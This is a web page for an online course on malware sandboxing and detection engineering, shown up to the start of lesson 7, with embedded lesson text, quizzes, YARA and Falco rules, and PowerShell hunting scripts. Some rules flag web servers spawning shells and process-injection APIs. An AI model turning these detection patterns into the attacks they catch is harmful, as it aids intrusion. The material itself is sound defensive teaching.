



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <title>Sandboxing & Detection Engineering - Lessons | CipherHall</title>
    <meta name="description" content="Interactive lesson interface for the Sandboxing & Detection Engineering course. Log in to track your progress and master cybersecurity skills." />

    <link rel="canonical" href="https://www.cipherhall.com/courses/sandboxing-and-detection-detail.html" />

    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Course",
      "name": "Sandboxing & Detection Engineering",
      "description": "A comprehensive, 30-lesson course on the design, implementation, and analysis of automated sandboxing systems for malware detection.",
      "provider": {
        "@type": "Organization",
        "name": "CipherHall",
        "sameAs": "https://www.cipherhall.com"
      },
      "hasCourseInstance": {
        "@type": "CourseInstance",
        "courseMode": "Online",
        "instructor": {
          "@type": "Person",
          "name": "Dr. Anya Sharma"
        }
      }
    }
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@700;800;900&display=swap" rel="stylesheet" />
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" />
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
    
    <link rel="stylesheet" href="assets/css/coursepages.css">
</head>
<body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
        <div class="loader-icon">
            <i class="fas fa-graduation-cap"></i>
        </div>
        <div class="loader-text">Loading Course Content...</div>
    </div>
    
    <!-- Sidebar Overlay for Mobile -->
    <div class="sidebar-overlay" id="sidebarOverlay"></div>
    
    <!-- Music Player (fixed at top right) -->
    <div class="header-controls">
        <div class="music-dropdown" id="music-dropdown">
            <button class="btn btn-secondary">
                <span id="music-button-text">STUDY MUSIC</span>
                <i id="music-icon" class="fa-solid fa-music"></i>
            </button>
            <div class="music-dropdown-content" id="music-dropdown-content">
                <a href="#" data-src="https://www.learningcontainer.com/wp-content/uploads/2020/02/Kalimba.mp3">1. Coffee Shop Vibes</a>
                <a href="#" data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3">2. City Lights Lofi</a>
                <a href="#" data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3">3. Mellow Thoughts</a>
                <a href="#" data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-13.mp3">4. Rainy Mood</a>
                <a href="#" data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3">5. Time Alone</a>
                <a href="#" id="stop-music-link"><i class="fa-solid fa-stop-circle"></i> Stop Music</a>
            </div>
        </div>
        
        <button class="btn btn-secondary" id="resetProgressBtn">
            <i class="fas fa-redo"></i>
            Reset Progress
        </button>
    </div>

    <!-- Auth Modal -->
    <div id="authModal" class="modal" style="display: none">
        <div class="modal-overlay"></div>
        <div class="modal-content">
            <span class="close" id="closeAuthModal">&times;</span>
            <div class="auth-tabs">
                <button id="tabSignIn" class="auth-tab active">Sign In</button>
                <button id="tabSignUp" class="auth-tab">Sign Up</button>
            </div>
            <div id="authLoader" style="display: none; text-align: center; padding: 2rem">
                <i class="fas fa-spinner fa-spin fa-2x" style="color: var(--color-green)"></i>
                <p style="margin-top: 0.5rem">Authenticating...</p>
            </div>
            <div id="signInForm" class="auth-form">
                <h2>Sign In to CyberSec Academy</h2>
                <button id="googleSignIn" class="btn btn-google">
                    <i class="fab fa-google"></i> Continue with Google
                </button>
                <div class="divider"><span>or</span></div>
                <form id="emailSignInForm">
                    <input type="email" id="signInEmail" placeholder="Email Address" required>
                    <input type="password" id="signInPassword" placeholder="Password" required>
                    <button type="submit" class="btn btn-primary">Sign In</button>
                </form>
            </div>
            <div id="signUpForm" class="auth-form" style="display: none">
                <h2>Join CyberSec Academy</h2>
                <button id="googleSignUp" class="btn btn-google">
                    <i class="fab fa-google"></i> Continue with Google
                </button>
                <div class="divider"><span>or</span></div>
                <form id="emailSignUpForm">
                    <input type="text" id="signUpName" placeholder="Full Name" required>
                    <input type="email" id="signUpEmail" placeholder="Email Address" required>
                    <input type="password" id="signUpPassword" placeholder="Password (min. 8 characters)" required>
                    <button type="submit" class="btn btn-secondary">Create Account</button>
                </form>
            </div>
            <div id="authMessage"></div>
        </div>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
        <div class="sidebar-header">
            <div class="course-info">
                <h1 class="course-title" id="courseTitle">Loading...</h1>
                <div class="course-progress">
                    <div class="progress-header">
                        <span class="progress-label">Course Progress</span>
                        <span class="progress-percentage" id="courseProgressPercent">0%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="courseProgressFill" style="width: 0%"></div>
                    </div>
                    <div class="progress-stats">
                        <span id="completedLessons">0</span>
                        <span id="totalLessons">0</span>
                    </div>
                </div>
                <a href="/dashboard.html" class="back-to-dashboard">
                    <i class="fas fa-arrow-left"></i>
                    Back to Dashboard
                </a>
            </div>
        </div>

        <nav class="lesson-nav" id="lessonNav">
            <!-- Lessons will be loaded dynamically -->
        </nav>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
        <header class="content-header">
            <div class="lesson-header">
                <div class="lesson-header-left">
                    <span class="lesson-number" id="currentLessonNumber">1</span>
                    <h1 class="lesson-header-title" id="currentLessonTitle">Loading...</h1>
                </div>
                <div class="lesson-actions">
                    <button class="mbtn btn-primary" id="menuToggle">
                        <i class="fas fa-bars"></i>
                       
                    </button>
                </div>
            </div>
        </header>

        <div class="content-body" id="contentBody">
            <div class="lesson-content" id="lessonContent">
                <!-- Lesson content will be loaded dynamically -->
            </div>
        </div>

        <footer class="lesson-navigation">
            <div class="nav-info" id="navInfo">
                Lesson 1 of 10
            </div>
            <div class="nav-controls">
                <button class="btn btn-secondary" id="prevLessonBtn" disabled>
                    <i class="fas fa-chevron-left"></i>
                    Previous
                </button>
                <button class="btn btn-primary" id="nextLessonBtn" disabled>
                    Next
                    <i class="fas fa-chevron-right"></i>
                </button>
            </div>
        </footer>
    </main>

    <!-- Achievement Notification -->
    <div id="achievementNotification" class="achievement-notification">
        <div class="notification-header">
            <div class="notification-icon" id="notificationIcon">
                <i class="fas fa-trophy"></i>
            </div>
            <div class="notification-content">
                <h3 id="notificationTitle">Achievement Unlocked!</h3>
                <p id="notificationDescription">Description here...</p>
            </div>
        </div>
        <div class="notification-reward" id="notificationReward">
            <i class="fas fa-coins"></i>
            <span id="notificationPoints">+100 Points</span>
        </div>
    </div>

    <!-- Toast Notification -->
    <div id="toast" class="toast">
        <span id="toastMessage"></span>
    </div>

    <script>
       // =====================================================
// SYNCHRONIZED COURSE SYSTEM WITH DASHBOARD INTEGRATION
// =====================================================

// Supabase Configuration - Replace with your config
const supabaseUrl = 'https://lzcmzulemfubjaksoqor.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6Y216dWxlbWZ1Ympha3NvcW9yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTUzMzM5MDgsImV4cCI6MjA3MDkwOTkwOH0.crhPH4YWtRsr1BJTpAQcmPbWSpwIWRbzoI4sRb2_fPI';
const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

// =====================================================
// COURSE DATA STRUCTURE - REPLACE WITH YOUR COURSE JSON
// =====================================================
  const COURSE_DATA = {
    "id": "sandboxing-and-detection",
    "title": "Sandboxing & Detection Engineering",
    "description": "A comprehensive, 30-lesson course on the design, implementation, and analysis of automated sandboxing systems for malware detection. This syllabus is strictly defense-oriented, focusing on how to build, operate, and interpret data from sandboxes to create high-fidelity detection rules, all within an ethical framework using benign samples.",
    "category": "cybersecurity_engineering",
    "difficulty": "Intermediate to Advanced",
    "duration": "60 hours",
    "instructor": "Dr. Anya Sharma",
    "lessons": [
        {
            "id": "lesson-1",
            "title": "Module 1: Sandbox Foundations - Introduction to Sandboxing",
            "duration": "90 min",
            "objectives": [
                "Define a security sandbox and its primary purpose.",
                "Differentiate between high-interaction (full-system) and low-interaction (API emulation) sandboxes.",
                "Discuss the key ethical use cases for sandboxing in a defensive security program.",
                "Identify the inherent limitations and challenges of automated analysis."
            ],
            "content": {
                "overview": "This foundational lesson introduces the concept of a sandbox as a tool for automated dynamic analysis. We will explore why sandboxing is a cornerstone of modern threat detection, compare the different architectural approaches, and set the ethical ground rules that will govern all our lab work.",
                "sections": [
                    {
                        "title": "What is a Sandbox?",
                        "content": "<p>In cybersecurity, a sandbox is an isolated, controlled environment where a potentially malicious program can be executed and observed without risk to the host system or network. The primary goal is to automatically capture the program's behavior—what files it creates, what network connections it makes, what registry keys it modifies—and generate a structured report for a security analyst.</p>"
                    },
                    {
                        "title": "Types of Sandboxes",
                        "content": "<ul><li><strong>High-Interaction (Full-System Emulation):</strong> This type of sandbox uses a full, real operating system running in a virtual machine (VM). It provides the most accurate environment but is slower and can be detected by anti-VM malware. Examples include Cuckoo Sandbox and CAPE.</li><li><strong>Low-Interaction (API Emulation):</strong> This type uses an emulated or 'fake' operating system that mimics the responses of real API calls. It is extremely fast and scalable but can be easily bypassed by malware that uses unusual APIs or checks for system artifacts.</li></ul>"
                    }
                ],
                "activities": [
                    {
                        "title": "Compare Sandbox Solutions",
                        "description": "Research two public sandbox solutions (e.g., Any.Run and a different one of your choice). For a benign sample (like the `putty.exe` executable), compare the reports they generate. Note the similarities and differences in the types of Indicators of Compromise (IOCs) they extract."
                    }
                ]
            },
            "quiz": {
                "passingScore": 80,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of a security sandbox?",
                        "options": ["To remove viruses from a file.", "To execute a program in a safe, isolated environment to automatically observe its behavior.", "To make a program run faster.", "To edit the source code of a program."],
                        "correct": 1,
                        "explanation": "Sandboxing is a dynamic analysis technique focused on safely and automatically collecting behavioral data."
                    },
                    {
                        "id": 2,
                        "question": "A major limitation of all sandboxing technology is that:",
                        "options": ["It is too slow to be useful.", "It cannot analyze Windows files.", "Sophisticated malware may have anti-sandbox features and will not display its malicious behavior in a detectable way.", "It requires a supercomputer to run."],
                        "correct": 2,
                        "explanation": "The cat-and-mouse game of sandbox detection and evasion is a central challenge in this field. No sandbox is perfect, which is why manual analysis skills remain important."
                    }
                ]
            }
        },
        {
            "id": "lesson-2",
            "title": "Module 1: Foundations - Lab Environment Setup",
            "duration": "120 min",
            "objectives": [
                "Install and configure a Type 2 hypervisor (VirtualBox/VMware).",
                "Create a dedicated Windows analysis VM with proper hardening and isolation.",
                "Set up a Linux VM with INetSim for controlled network simulation.",
                "Establish a repeatable workflow using VM snapshots for clean analysis."
            ],
            "content": {
                "overview": "Building a reliable and safe lab environment is the most critical hands-on skill for a detection engineer. This lesson walks through the end-to-end setup of a minimal but functional sandbox lab, including the analysis guest, the network simulator, and the correct isolation settings to ensure safety.",
                "sections": [
                    {
                        "title": "Guest VM (The 'Victim')",
                        "content": "<p>This will be our Windows VM where samples are executed. Key setup steps include:</p><ul><li><strong>OS Hardening:</strong> Disable Windows Update, Defender, and automatic notifications to reduce noise.</li><li><strong>Tool Installation:</strong> Install common applications (Office, Adobe Reader) as malware often looks for these. Also, install our monitoring tools like Process Monitor.</li><li><strong>Network Configuration:</strong> Set the VM's network to an internal or host-only network. Set its DNS server to point to our INetSim machine.</li><li><strong>Snapshotting:</strong> Take a 'clean' snapshot once the setup is perfect. Every analysis will start by reverting to this clean state.</li></ul>"
                    },
                    {
                        "title": "Network Simulator (The 'Internet')",
                        "content": "<p>A second, lightweight Linux VM will run INetSim. This tool listens for requests and provides fake responses for common protocols like DNS, HTTP, and FTP. This allows us to see what domains a sample is trying to contact and what files it tries to download, all without any real internet connectivity.</p>"
                    }
                ],
                "activities": [
                    {
                        "title": "Build a Minimal Sandbox Environment",
                        "description": "Following a detailed guide, install and configure both a Windows 10 analysis VM and a Debian Linux INetSim VM in VirtualBox. Configure the networking so that the Windows VM's DNS and HTTP traffic is routed to the INetSim VM. Revert both to a clean snapshot after the setup is complete."
                    }
                ]
            },
            "quiz": {
                "passingScore": 80,
                "questions": [
                    {
                        "id": 1,
                        "question": "In a sandbox lab, what is the role of a 'clean snapshot'?",
                        "options": ["It is a backup of the malware sample.", "It is a saved state of the virtual machine before any analysis is performed, allowing the analyst to revert to a known-good condition after each run.", "It is a log file of the malware's activity.", "It is a picture of the virtual machine's screen."],
                        "correct": 1,
                        "explanation": "Snapshots are the key to a repeatable and non-contaminated analysis workflow."
                    },
                    {
                        "id": 2,
                        "question": "Why is a tool like INetSim used in a sandbox environment?",
                        "options": ["To provide high-speed internet access.", "To safely simulate internet services and intercept the malware's network requests without actual internet connectivity.", "To block all network traffic.", "To automatically download real files requested by the malware."],
                        "correct": 1,
                        "explanation": "INetSim provides a safe, controlled way to observe and log network behavior, which is a critical part of dynamic analysis."
                    }
                ]
            }
        },
        {
            "id": "lesson-3",
            "title": "Module 1: Foundations - Sandbox Architectures",
            "duration": "90 min",
            "objectives": [
                "Understand the high-level architecture of a Cuckoo-style sandbox.",
                "Differentiate between in-guest monitoring agents and hypervisor-level introspection.",
                "Analyze the data flow from guest to host.",
                "Discuss the pros and cons of different architectural choices."
            ],
            "content": {
                "overview": "This lesson moves from the manual lab setup to understanding how automated, open-source sandboxes like Cuckoo and CAPE are architected. We will diagram the components and data flows, providing the conceptual framework needed to understand where the behavioral data comes from and how it is processed.",
                "sections": [
                    {
                        "title": "The Cuckoo Sandbox Model",
                        "content": "<p>The Cuckoo model is the basis for most open-source sandboxes and consists of several key components:</p><ul><li><strong>Host Machine (The 'Analyzer'):</strong> A Linux machine that runs the Cuckoo daemon, manages the VMs, and processes the results.</li><li><strong>Guest VM (The 'Victim'):</strong> One or more Windows VMs where samples are run.</li><li><strong>In-Guest Agent:</strong> A small agent (`agent.py`) runs inside the guest VM. It communicates with the host over a private network to receive the sample, execute it, and report back status.</li><li><strong>Monitoring Code:</strong> The host machine injects monitoring code (a DLL) into processes on the guest. This code hooks critical Windows API functions and sends a log of every call back to the host machine for analysis.</li></ul>"
                    },
                    {
                        "title": "Hypervisor-Level Introspection",
                        "content": "<p>A more advanced (and stealthier) monitoring technique is hypervisor-level introspection. Instead of an agent inside the guest, this approach uses the hypervisor (like KVM) to inspect the guest's memory and CPU state from the outside. This is much harder for malware to detect but is more complex to implement. Tools like DRAKVUF work on this principle.</p>"
                    }
                ],
                "activities": [
                    {
                        "title": "Diagram Sandbox Architectures",
                        "description": "Create two diagrams. The first will show the architecture of a Cuckoo-style sandbox with an in-guest agent and DLL injection. The second will show the architecture of a hypervisor-introspection sandbox. Label the components (host, guest, agent, API server, etc.) and draw arrows to show the primary data flows."
                    }
                ]
            },
            "quiz": {
                "passingScore": 80,
                "questions": [
                    {
                        "id": 1,
                        "question": "In a Cuckoo-style sandbox, what is the role of the 'in-guest agent'?",
                        "options": ["To scan for viruses.", "To run on the host machine and analyze results.", "To run inside the guest VM, receive the sample from the host, execute it, and manage the analysis run.", "To provide internet access."],
                        "correct": 2,
                        "explanation": "The agent is the host's control point inside the guest, responsible for orchestrating the analysis process."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary advantage of hypervisor-level introspection for monitoring?",
                        "options": ["It is simpler to set up.", "It is much stealthier because there is no monitoring agent running inside the guest OS for the malware to detect.", "It only works for Linux guests.", "It is faster than in-guest monitoring."],
                        "correct": 1,
                        "explanation": "By observing from the 'outside', hypervisor-level introspection avoids the entire cat-and-mouse game of in-guest agent detection."
                    }
                ]
            }
        },
        {
            "id": "lesson-4",
            "title": "Module 2: Host-Based Monitoring - Process Monitoring",
            "duration": "120 min",
            "objectives": [
              "Identify key process-related Windows APIs (CreateProcess, OpenProcess, CreateRemoteThread).",
              "Understand the basics of API hooking (e.g., IAT hooking).",
              "Use Process Monitor to filter and analyze process creation and inter-process events.",
              "Write a detection rule based on a suspicious process execution chain."
            ],
            "content": {
              "overview": "Understanding how a sample creates and interacts with other processes is fundamental to behavioral analysis. This lesson dives deep into monitoring process-level events, exploring the key Windows APIs involved and how a sandbox uses hooking to intercept them.",
              "sections": [
                {
                  "title": "Key Process APIs",
                  "content": "<p>A sandbox's process monitor hooks key functions to see what a sample is doing:</p><ul><li><strong>`CreateProcess`:</strong> The primary function for creating a new process. Monitoring this shows what new programs the malware is launching.</li><li><strong>`OpenProcess` & `WriteProcessMemory`:</strong> These are used to interact with another process's memory. Seeing these is a strong indicator of process injection.</li><li><strong>`CreateRemoteThread`:</strong> The final step in many process injection techniques, used to execute code within another process.</li><li><strong>`LoadLibrary`:</strong> Used to load a DLL into a process. This can be used for legitimate purposes or for DLL injection.</li></ul>"
                },
                {
                  "title": "API Hooking",
                  "content": "<p>To monitor these calls, a sandbox agent will perform API hooking. A common technique is IAT (Import Address Table) hooking. The monitor overwrites the address of a function like `CreateProcess` in the target process's memory, pointing it to the monitor's own code instead. When the program tries to call `CreateProcess`, it calls the monitor's code first. The monitor logs the arguments, then calls the real `CreateProcess` function and logs the result. This allows for transparent, real-time logging of all critical API calls.</p>"
                }
              ],
              "codeExamples": [
                {
                    "title": "Filter ProcMon for Process Creation",
                    "language": "text",
                    "code": "# This represents a filter set within the Process Monitor GUI.\n# A defender uses this to see only process creation events and the command line used to launch them.\n\n# Rule 1: Include if...\n# Column: Operation\n# Relation: is\n# Value: Process Create\n\n# Then, ensure the 'Command Line' column is visible to see what was executed."
                },
                {
                    "title": "PowerShell Script to Get Process Parent Info",
                    "language": "powershell",
                    "code": "# Defenders use live analysis scripts like this to hunt for suspicious process chains.\n# For example, it would be highly unusual for Microsoft Word (`winword.exe`) to spawn a PowerShell process.\nGet-CimInstance Win32_Process | Select-Object ProcessId, Name, ParentProcessId, @{Name='ParentName'; Expression={(Get-Process -Id $_.ParentProcessId -ErrorAction SilentlyContinue).Name}}, CommandLine | Format-Table -AutoSize"
                },
                {
                    "title": "YARA Rule to Detect Process Injection Artifacts",
                    "language": "yara",
                    "code": "/*\nThis YARA rule is used by defenders for static analysis to find files that are *likely*\nto perform process injection. It does this by looking for the names of the Windows API\nfunctions that are required for the technique.\n*/\nrule Detect_Classic_Process_Injection\n{\n    strings:\n        $s1 = \"OpenProcess\"\n        $s2 = \"VirtualAllocEx\"\n        $s3 = \"WriteProcessMemory\"\n        $s4 = \"CreateRemoteThread\"\n    condition:\n        uint16(0) == 0x5A4D and all of them\n}"
                },
                {
                    "title": "Falco Rule for Suspicious Process Chains",
                    "language": "yaml",
                    "code": "# Falco is a runtime security tool. Defenders use rules like this to get real-time alerts.\n# This rule detects when a web server process (like nginx or apache) spawns a shell,\n# which is a very strong indicator of compromise.\n- rule: Web Server Spawns Shell\n  desc: A web server process spawned a shell, which could indicate a web shell or RCE.\n  condition: >\n    spawned_process and container and\n    ((proc.pname in (httpd, nginx)) and (proc.name in (sh, bash, ksh, csh)))\n  output: \"Web server spawned a shell in a container (user=%user.name command=%proc.cmdline)\"\n  priority: CRITICAL"
                }
              ],
              "activities": [
                {
                  "title": "Analyze Process Activity with ProcMon",
                  "description": "Run a benign software installer (e.g., `7z.exe`). Use Process Monitor with a filter set to only show events from the installer process. Analyze the log to see if the installer spawns any other processes (like `msiexec.exe`). Document the process tree."
                }
              ]
            },
            "quiz": {
              "passingScore": 80,
              "questions": [
                {
                  "id": 1,
                  "question": "If a sandbox report shows a process calling `OpenProcess`, `WriteProcessMemory`, and `CreateRemoteThread`, what technique is it most likely attempting?",
                  "options": ["File creation", "Network C2 communication", "Persistence via registry", "Process injection"],
                  "correct": 3,
                  "explanation": "This specific sequence of API calls is the classic signature of the process injection technique."
                },
                {
                  "id": 2,
                  "question": "What is API hooking?",
                  "options": ["A way to call an API faster.", "The process of intercepting function calls to monitor or modify their behavior.", "A type of malicious software.", "A network protocol."],
                  "correct": 1,
                  "explanation": "Hooking is the core mechanism that allows a sandbox monitor to see what a program is doing at a low level."
                }
              ]
            }
        },
        {
            "id": "lesson-5",
            "title": "Module 2: Host-Based Monitoring - File System Monitoring",
            "duration": "90 min",
            "objectives": [
              "Identify key file I/O APIs (CreateFile, WriteFile, DeleteFile).",
              "Recognize common file-related malware behaviors (dropping files in temp folders, creating copies of itself).",
              "Use Process Monitor to track file creation, modification, and deletion.",
              "Write a detection rule for a suspicious file drop location."
            ],
            "content": {
              "overview": "Malware almost always interacts with the file system, whether it's to drop its primary payload, create configuration files, or encrypt a user's data. This lesson focuses on the techniques and tools used to monitor all file system input/output (I/O) operations.",
              "sections": [
                {
                  "title": "Common File-Based Behaviors",
                  "content": "<p>A sandbox looks for tell-tale patterns of file activity:</p><ul><li><strong>Dropping Files:</strong> The initial malware process (the 'dropper') often contains a second, more malicious file that it writes ('drops') to the disk and then executes. Common drop locations include `%TEMP%`, `%APPDATA%`, or `C:\\Users\\Public`.</li><li><strong>Masquerading:</strong> Malware often renames itself to look like a legitimate Windows process, such as `svchost.exe` or `explorer.exe`, but drops itself in an unusual location (e.g., `%APPDATA%\\svchost.exe`).</li><li><strong>Ransomware Behavior:</strong> Ransomware exhibits a very distinct pattern: it rapidly reads a user file (e.g., `document.docx`), writes a new encrypted version (`document.docx.encrypted`), and then deletes the original.</li></ul>"
                }
              ],
              "codeExamples": [
                {
                    "title": "Filter ProcMon for File Write Operations",
                    "language": "text",
                    "code": "# This ProcMon filter helps a defender focus on what a process is writing to disk.\n\n# Rule 1: Include if...\n# Column: Process Name\n# Relation: is\n# Value: benign_sample.exe\n\n# Rule 2: And if...\n# Column: Operation\n# Relation: is\n# Value: WriteFile"
                },
                {
                    "title": "Parse ProcMon Log for File Deletions",
                    "language": "python",
                    "code": "# This script automates the analysis of a ProcMon log to find deleted files.\n# A defender would use this to investigate potential ransomware activity or defense evasion.\nimport csv\n\ndef find_deleted_files(procmon_csv_path, process_name):\n    deleted_files = set()\n    try:\n        with open(procmon_csv_path, 'r', encoding='utf-8') as f:\n            reader = csv.DictReader(f)\n            for row in reader:\n                # SetDispositionInformationFile is often used for deletion\n                if row['Process Name'] == process_name and 'Delete' in row['Detail']:\n                    deleted_files.add(row['Path'])\n        print(f'--- Files deleted by {process_name} ---')\n        for path in sorted(list(deleted_files)):\n            print(path)\n    except FileNotFoundError:\n        print(f'File not found: {procmon_csv_path}')\n\n# Usage:\n# find_deleted_files('procmon_log.csv', 'benign_program.exe')"
                },
                {
                    "title": "Falco Rule to Detect Writes to Sensitive Directories",
                    "language": "yaml",
                    "code": "# Defenders use this Falco rule to get a real-time alert if any process other than a known-good one\n# writes to sensitive system directories. This is a strong sign of a dropper or rootkit.\n- rule: Write below binary dir\n  desc: an attempt to write to any file below a set of binary directories\n  condition: >\n    open_write and fd.directory in (/bin, /sbin, /usr/bin, /usr/sbin) and not proc.name in (known_good_installers)\n  output: \"File below a binary dir opened for writing in container (user=%user.name command=%proc.cmdline file=%fd.name)\"\n  priority: ERROR"
                },
                {
                    "title": "PowerShell Script to Watch a Directory for Changes",
                    "language": "powershell",
                    "code": "# This is a simple live-monitoring script a defender can use to watch for file drops.\n# It uses .NET objects to monitor a specific folder (e.g., the Downloads folder) for any new file creations.\n\n$watcher = New-Object System.IO.FileSystemWatcher\n$watcher.Path = \"C:\\Users\\Analyst\\Downloads\"\n$watcher.IncludeSubdirectories = $true\n$watcher.EnableRaisingEvents = $true  \n\nRegister-ObjectEvent $watcher \"Created\" -Action { \n    Write-Host \"[ALERT] New file created: $($event.SourceEventArgs.FullPath)\"\n}"
                }
              ],
              "activities": [
                {
                  "title": "Monitor File I/O of a Benign Installer",
                  "description": "Run the `7z.exe` installer in your lab VM while Process Monitor is running. Filter the results to only show 'WriteFile' and 'DeleteFile' operations from the installer process. Analyze the log to see where the application's files are created (e.g., in `C:\\Program Files`)."
                }
              ]
            },
            "quiz": {
              "passingScore": 80,
              "questions": [
                {
                  "id": 1,
                  "question": "A malware sample that writes a new executable file to the `%APPDATA%` directory is often referred to as a:",
                  "options": ["Scanner", "Dropper", "Keylogger", "Worm"],
                  "correct": 1,
                  "explanation": "A dropper is a type of malware whose primary purpose is to install other malicious files onto the system."
                },
                {
                  "id": 2,
                  "question": "Observing a process rapidly reading many user documents, writing new files with a `.locked` extension, and then deleting the originals is a strong behavioral signature for what type of malware?",
                  "options": ["Spyware", "A worm", "Adware", "Ransomware"],
                  "correct": 3,
                  "explanation": "This specific read-write-delete pattern is the classic hallmark of ransomware encrypting a user's files."
                }
              ]
            }
        },
        {
            "id": "lesson-6",
            "title": "Module 2: Host-Based Monitoring - Registry Monitoring",
            "duration": "90 min",
            "objectives": [
              "Understand the purpose of the Windows Registry and key hives (HKCU, HKLM).",
              "Identify common registry keys used for malware persistence (Run, Services).",
              "Use Regshot and Process Monitor to detect registry modifications.",
              "Write a detection rule for the creation of a suspicious autorun key."
            ],
            "content": {
              "overview": "The Windows Registry is a central database for configuration data, and it is a primary target for malware seeking to hide its configuration or make itself run automatically. This lesson covers how sandboxes monitor interactions with the registry to uncover these techniques.",
              "sections": [
                {
                  "title": "Registry for Persistence",
                  "content": "<p>Persistence is the ability of malware to survive a reboot. The registry is the most common way to achieve this. By adding a value to one of the `Run` keys, a program can ensure it is automatically launched every time the user logs in or the system boots.</p><ul><li><strong>`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`</strong>: Runs for the current user's login.</li><li><strong>`HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`</strong>: Runs for all users on system boot.</li><li><strong>Services Keys:</strong> Malware can also create a new service by writing to `HKLM\\SYSTEM\\CurrentControlSet\\Services` to achieve persistence with higher privileges.</li></ul>"
                }
              ],
              "codeExamples": [
                {
                    "title": "Filter ProcMon for Registry Writes",
                    "language": "text",
                    "code": "# This ProcMon filter helps a defender see only the registry keys that a process is creating or modifying.\n# They would pay close attention to any writes to keys containing 'CurrentVersion\\Run'.\n\n# Rule 1: Include if...\n# Column: Process Name\n# Relation: is\n# Value: benign_sample.exe\n\n# Rule 2: And if...\n# Column: Operation\n# Relation: begins with\n# Value: RegSet"
                },
                {
                    "title": "Use Regshot for Before/After Comparison",
                    "language": "text",
                    "code": "// This is a manual workflow a defender uses for precise registry analysis.\n// 1. In the lab VM, run Regshot.exe.\n// 2. Click '1st shot' and then 'Shot and Save'. This saves the 'before' state.\n// 3. Run the benign sample (e.g., an installer).\n// 4. Click '2nd shot' and then 'Shot and Save'. This saves the 'after' state.\n// 5. Click 'Compare'. Regshot will produce an HTML report showing exactly which keys and values were added, deleted, or modified."
                },
                {
                    "title": "Falco Rule for a New Scheduled Task",
                    "language": "yaml",
                    "code": "# While not strictly registry, creating a scheduled task is a common persistence alternative.\n# This Falco rule alerts a defender when the `schtasks.exe` command is used to create a new task,\n# as this is a very common malware persistence TTP.\n- rule: Create New Scheduled Task\n  desc: A new scheduled task was created via schtasks.exe.\n  condition: spawned_process and proc.name = schtasks and proc.args contains \"create\"\n  output: \"New scheduled task created (user=%user.name command=%proc.cmdline)\"\n  priority: NOTICE"
                },
                {
                    "title": "PowerShell Script to Check Autorun Points",
                    "language": "powershell",
                    "code": "# This is a script a defender would run during live analysis or forensics.\n# It automatically queries all the common registry and file system locations for programs\n# that are set to run at startup.\nGet-CimInstance Win32_StartupCommand | Select-Object Name, Command, User, Location | Format-Table -AutoSize"
                }
              ],
              "activities": [
                {
                  "title": "Detect Registry Writes by a Benign Installer",
                  "description": "Using a benign software installer in your lab, take 'before' and 'after' snapshots with Regshot. Run the installer. Compare the snapshots and analyze the report to identify the registry keys the installer created for its own configuration and uninstallation information."
                }
              ]
            },
            "quiz": {
              "passingScore": 80,
              "questions": [
                {
                  "id": 1,
                  "question": "A malware sample creates a new value in the `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` registry key. What is it trying to achieve?",
                  "options": ["Deleting user files", "Achieving persistence to survive a reboot", "Communicating with a C2 server", "Crashing the computer"],
                  "correct": 1,
                  "explanation": "The 'Run' keys are one of the most common and effective ways for malware to ensure it is automatically executed when the system starts."
                },
                {
                  "id": 2,
                  "question": "What is the primary function of a tool like Regshot?",
                  "options": ["To edit the registry.", "To capture network traffic.", "To take 'before' and 'after' snapshots of the registry and compare them to find all changes.", "To monitor file system activity."],
                  "correct": 2,
                  "explanation": "Regshot is a differential analysis tool, which makes it very easy to see the specific changes a program makes to the registry without having to manually sift through thousands of events in ProcMon."
                }
              ]
            }
        },
        {
            "id": "lesson-7",
            "title": "Module 2: Network Monitoring & Analysis",
            "duration": "120 min",
            "objectives": [
                "Understand the importance of network traffic analysis in sandboxing.",
                "Identify common C2 protocols (HTTP/HTTPS, DNS).",
                "Use Wireshark filters to isolate and analyze DNS and HTTP traffic.",
                "Differentiate between normal traffic and suspicious 'beaconing' behavior."
            ],
            "content": {
                "overview": "Network traffic is often the most revealing aspect of a malware sample's behavior. It can expose command-and-control (C2) servers, data exfiltration, and the download of additional payloads. This lesson provides a deep, hands-on dive into capturing and analyzing network activity from our sandbox.",
                "sections": [
                    {
                        "title": "Capturing and Analyzing with Wireshark",
